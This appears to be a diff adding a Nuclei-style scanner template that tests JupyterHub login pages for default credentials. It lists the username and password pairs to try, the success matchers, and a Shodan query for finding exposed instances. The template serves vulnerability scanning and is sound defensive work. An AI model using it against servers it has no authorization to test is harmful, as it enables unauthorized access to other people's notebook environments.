@@ -1,0 +1,41 @@
+id: jupyterhub-default-login
+
+info:
+  name: Jupyterhub Default Login
+  author: For3stCo1d
+  severity: high
+  reference:
+    - https://github.com/jupyterhub/jupyterhub
+  metadata:
+    shodan-query: http.title:"JupyterHub"
+  tags: jupyterhub,default-login
+
+requests:
+  - raw:
+      - |
+        POST /hub/login?next= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{user}}&password={{pass}}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - admin
+        - jovyan
+      pass:
+        - admin
+        - jupyter
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(tolower(all_headers), 'jupyterhub-session-id=')
+          - contains(tolower(all_headers), 'jupyterhub-hub-login=')
+        condition: and
+
+      - type: status
+        status:
+          - 302
